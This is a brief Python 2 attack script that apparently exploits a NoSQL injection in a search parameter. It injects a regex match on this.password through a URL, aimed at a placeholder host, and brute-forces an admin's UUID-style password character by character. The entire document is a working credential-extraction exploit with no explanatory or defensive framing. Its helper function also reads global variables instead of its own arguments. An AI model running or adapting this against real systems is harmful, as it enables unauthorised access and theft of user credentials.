import requests


def modify_pwd(pwd, idx):
    # password format XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX

    if idx in [8, 13, 18, 23]:
        return pwd[:idx] + '-' + pwd[idx + 1:]

    c = passwd[index]
    modified = chr(ord(c) + 1)
    if c == '9':
        modified = 'a'

    if ord(modified) > ord('f'):
        raise Exception("Character {} out of range [0-9a-f]".format(modified))

    return pwd[:idx] + modified + pwd[idx + 1:]


url = "http://foo.bar/?search=admin'%26%26this.password.match({})%00"

wildcard_test = "/^{}.*$/"
full_test = "/^{}$/"

passwd = "0"
index = 0

wildcard = True

while True:

    if wildcard:
        val = wildcard_test.format(passwd)
    else:
        val = full_test.format(passwd)

    test_path = url.format(val)

    r = requests.get(test_path)

    if "?search=admin" in r.text:
        if wildcard:
            print "{}".format(passwd)
            wildcard = False
        else:
            print "Found password: {}".format(passwd)
            break
    else:
        if wildcard:
            passwd = modify_pwd(passwd, index)
        else:
            passwd = passwd + "0"
            index = index + 1
            wildcard = True
